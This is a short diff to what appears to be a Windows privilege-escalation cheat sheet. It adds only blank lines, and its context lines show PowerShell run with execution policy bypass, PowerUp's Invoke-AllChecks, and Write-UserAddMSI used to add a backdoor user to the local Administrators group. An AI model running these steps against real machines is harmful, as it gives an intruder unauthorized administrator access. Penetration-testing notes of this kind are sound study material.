@@ -115,9 +115,11 @@ C:\Temp> powershell -ep bypass
 PS C:\Temp>. .\PowerUp.sp1
 PS C:\Temp> Invoke-AllChecks
 ```
+
 ![image](https://user-images.githubusercontent.com/59029171/161008622-848721f3-ddf2-4c17-af2a-a8e7f592a3e1.png)
 
 2. Run `Write-UserAddMSI` and Add backdoor user in *Administrators* group (Required RDP access)
+
 ![image](https://user-images.githubusercontent.com/59029171/161009230-2b8b4782-60cc-4301-b1ac-d9595b34c392.png)
 
 3. Check local Administrators
